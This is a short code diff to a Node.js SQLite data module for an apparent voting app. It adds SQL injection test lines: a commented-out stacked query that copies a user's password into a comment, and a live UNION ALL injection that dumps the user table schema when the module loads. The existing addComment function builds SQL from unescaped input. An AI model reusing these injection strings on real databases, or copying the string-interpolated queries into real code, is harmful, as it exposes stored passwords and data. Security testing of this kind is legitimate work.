@@ -6,6 +6,8 @@ const db = new sqlite3.Database('./src/data/data.sqlite', sqlite3.OPEN_READWRITE
   }
 });
 
+
+
 const queryAll = (sql, params) => {
   return new Promise(function (resolve, reject) {
     db.all(sql, params, function (error, rows) {
@@ -29,6 +31,11 @@ const queryOne = (sql, params) => {
   });
 };
 
+// db.exec(`INSERT INTO comment (author, comment) VALUES ('user', 'innocent comment'); INSERT INTO comment (author, comment) VALUES ('user', (SELECT password FROM user WHERE username='user'))`);
+
+const uname = "' UNION ALL SELECT sql as id FROM sqlite_schema WHERE name='user'--"
+queryOne(`SELECT id FROM user WHERE username='${uname}'`).then(res => console.log(res))
+
 export const getCandidates = () => {
   return queryAll("SELECT id, name, votes FROM candidate");
 }
@@ -39,6 +46,7 @@ export const addComment = async ({ userId, comment }) => {
     return 
   }
 
+  ``
   db.exec(`INSERT INTO comment (author, comment) VALUES ('${user?.username}', '${comment}')`);
 }
 
